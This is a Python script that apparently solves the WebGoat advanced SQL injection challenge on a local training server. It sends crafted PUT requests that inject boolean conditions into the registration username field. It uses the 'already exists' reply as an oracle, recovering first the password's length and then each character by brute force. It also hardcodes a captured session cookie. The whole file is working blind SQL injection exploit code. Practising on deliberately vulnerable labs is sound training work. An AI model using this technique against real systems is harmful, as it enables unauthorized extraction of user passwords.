import http.client
import urllib.parse


def PUT_WebGoat_SqlInjectionAdvanced_challenge(
        username: str,
) -> http.client.HTTPResponse:
    method, path = 'PUT', '/WebGoat/SqlInjectionAdvanced/challenge'
    host, port = 'localhost', 8080
    body = f'username_reg={username}&email_reg=xxx%40x.com&password_reg=xxx&confirm_password_reg=xxx'
    headers = {
        'Host': 'localhost:8080',
        'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/118.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-Requested-With': 'XMLHttpRequest',
        'Content-Length': str(len(body)),
        'Origin': 'http://localhost:8080',
        'Connection': 'keep-alive',
        'Referer': 'http://localhost:8080/WebGoat/start.mvc?username=testuser1',
        'Cookie': 'hijack_cookie=8526824206571018870-1712961702743; JSESSIONID=jBbVo-VI964ICUpN_0NtvV55jsiu9ccrvYLQ8IpN',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
    }
    connection = http.client.HTTPConnection(host, port)
    connection.request(method, path, body, headers)
    return connection.getresponse()


def resolve_query(
        query: str,
) -> bool:
    username = urllib.parse.quote(f"tom' and {query}; --")
    response = PUT_WebGoat_SqlInjectionAdvanced_challenge(username)
    if (response.status != 200):
        raise Exception(f"Bad status: {response.status} {response.read().decode('utf-8')}")
    return 'already exists' in response.read().decode("utf-8")


print(f"Sanity check (should be True): {resolve_query('1 = 1')}")
print(f"Sanity check (should be False): {resolve_query('1 = 2')}")

password_len = 0
while not resolve_query(f"length(password) = {password_len}"):
    password_len += 1
print(f"Password length: {password_len}")

chars = "qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890[]\;',./!@#$%^&*()_+-={}|:\"<>?"
password = ""
for i in range(password_len):
    for char in chars:
        if resolve_query(f"substring(password, {i + 1}, 1) = '{char}'"):
            password += char
            break
    else:
        raise Exception(f"Can't find password char at index {i}")
print(f"Password: {password}")
